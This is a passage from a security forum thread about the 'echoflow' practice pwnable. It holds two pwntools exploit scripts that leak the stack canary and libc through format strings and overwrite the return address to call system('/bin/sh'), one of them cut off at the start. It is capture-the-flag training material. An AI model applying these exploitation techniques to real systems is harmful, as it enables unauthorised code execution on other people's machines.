		payload += "%{}$n".format(str(off))

	p.sendline(payload)

	return

def ropme(payload, sys, ret, sh):

	p.recvuntil('can!\n')

	exploit  = payload
	exploit += p32(sys)
	exploit += p32(ret)
	exploit += p32(sh)

	p.sendline(exploit)

	return

def pwn():
	# Overwrite the counter variable
	overwrite(counter, 23, 0)

	# Leak stack canary
	payload  = ''
	payload += 'A'*128

	canary = leak_canary(payload)

	log.success("Canary: {}".format(str(hex(canary))))

	# Leak libc 
	fgets     = leak_libc(fgets_got, 23)
	libc_base = fgets - libc.symbols['fgets']
	system    = libc_base + libc.symbols['system']
	binsh     = libc_base + next(libc.search("/bin/sh\x00"))

	log.success("fgets:  {}".format(str(hex(fgets))))
	log.success("Libc:   {}".format(str(hex(libc_base))))
	log.success("system: {}".format(str(hex(system))))

	# 128 padding + canary + 12 padding + ROP payload
	payload  = ''
	payload += 'A'*128
	payload += p32(canary)
	# Padding until we reach the ret addr
	payload += 'A'*12

	ropme(payload, system, 0x41414141, binsh)

	echo('a')
	ovflow('a')
	echo('a')
	ovflow('a')

	p.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) &gt; 1:
        p = remote(sys.argv[1], int(sys.argv[2]))
        pwn(p)
    else:
        p    = process('./echoflow')
        libc = ELF('/lib/i386-linux-gnu/libc.so.6')
        pwn()

</code></pre>
</div>
<p>New pwnable is in the making <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_13" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/exploit"><span itemprop="name">exploit</span></a>
(exploit)
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-12T18:58:57Z" class="post-time">
August 12, 2017, 6:58pm
</time>
<meta itemprop="dateModified" content="2017-08-12T18:58:57Z">
<span itemprop="position">13</span>
</span>
</div>
<div class="post" itemprop="text">
<ul>
<li>Oh yeah *_* can’t wait! <img src="../../images/emoji/twitter/smile.png%3Fv=9" title=":smile:" class="emoji" alt=":smile:">
</li>
</ul>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_14" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/mkhdznfq"><span itemprop="name">mkhdznfq</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-12T19:24:47Z" class="post-time">
August 12, 2017, 7:24pm
</time>
<meta itemprop="dateModified" content="2017-08-12T19:24:47Z">
<span itemprop="position">14</span>
</span>
</div>
<div class="post" itemprop="text">
<p>great! since i’m fairly new in this, i learnt a lot from your pwnables <img src="../../images/emoji/twitter/grimacing.png%3Fv=9" title=":grimacing:" class="emoji" alt=":grimacing:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_15" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/segfault"><span itemprop="name">segfault</span></a>
(vladimir)
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-17T13:28:57Z" class="post-time">
August 17, 2017, 1:28pm
</time>
<meta itemprop="dateModified" content="2017-08-17T13:43:03Z">
<span itemprop="position">15</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Done , Good challenge <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<div class="spoiler">
<pre><code class="lang-python">    from pwn import *

    r = process('./echoflow')
    raw_input("++")



    stackgot = 0x0804a01c
    main = 0x80485dd

    readgot = 0x0804a010

    sysoff =0x3ab30

    libc_start = 0x18180

    binshoff = 0x15cdc8



    pld = p32(stackgot)+"%23$s" + " %39$X"

    r.recvuntil('back!')
    r.sendline(pld)
    r.recvuntil("\n")
    r.recvuntil("\n")

    data = r.recvuntil("\n").split(" ")

    libc_base = u32(data[0][2:6]) - libc_start

    canary = int("0x"+data[1][:-1],16)

    system = libc_base + sysoff

    binsh = libc_base + binshoff

    r.recvuntil("can!")


    final = "A"*128

    final += p32(canary)

    final += "AAAABBBBCCCC"

    final += p32(system)

    final += p32(0xdeadbeef)

    final += p32(binsh)

    r.sendline(final)

    r.interactive()
</code></pre>
</div>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_16" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
Closed
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-01-09T11:26:23Z" class="post-time">
January 9, 2018, 11:26am
</time>
<meta itemprop="dateModified" content="2018-01-09T11:26:23Z">
<span itemprop="position">16</span>
</span>
</div>
<div class="post" itemprop="text">
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
